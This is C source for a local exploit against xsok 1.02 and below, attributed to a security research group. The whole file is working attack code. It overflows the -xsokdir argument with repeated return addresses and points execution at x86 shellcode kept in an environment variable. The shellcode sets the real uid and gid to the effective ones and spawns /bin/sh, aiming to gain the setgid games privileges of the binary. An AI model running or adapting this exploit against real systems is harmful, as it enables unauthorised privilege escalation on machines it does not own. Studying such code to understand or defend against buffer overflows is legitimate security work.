/*
Another xsok 1.02 and below local game exploit
coded by n2n, n2n<at>linuxmail.org
Eye on Security Research Group, India http://www.eos-india.net
This one exploits the -xsokdir commandline overflow bug.
Also the shellcode is improved and automatically gets the effective uid and gid of the vulnerable binary.
Tested on Redhat Linux 9.0
*/

#define VULN "/usr/X11R6/bin/xsok"
#define BUFLEN	200
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* shellcode by me, n2n@linuxmail.org */
char *shellcode=
	/* setreuid(geteuid(),geteuid()), no use unless xsok is setuid, usually its only setgid games */
	"\x31\xc0\xb0\x31\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x46\xcd\x80"
	/* setregid(getegid(),getegid()) */
	"\x31\xc0\xb0\x32\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x47\xcd\x80"
	/* exec /bin/sh */
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
	/* exit() */
	"\x31\xdb\x89\xd8\xb0\x01\xcd\x80";

int main(int argc, char **argv)
{
	char exploit[BUFLEN+5];
	unsigned long addr_ret = 0xc0000000 - 4;
	char *arg0 = VULN;
	int i;
	if (argc > 2) {
		fprintf(stderr, "Usage: %s [PROG]\n", argv[0]);
		return 1;
	}
	if (argc > 1)
		arg0 = argv[1];
	addr_ret -= strlen(arg0) + 1;
	addr_ret -= strlen(shellcode) + 1; 
	setenv("EGG",shellcode,1);	
	for(i=0;i<BUFLEN;i+=4)
		*(unsigned int *)(exploit+i)=addr_ret;
	exploit[i]=0x0;
	printf("Using RET=%p\n",addr_ret);
	execl(arg0,arg0,"-xsokdir",exploit,NULL);
	printf("\n");
	return 1;
}
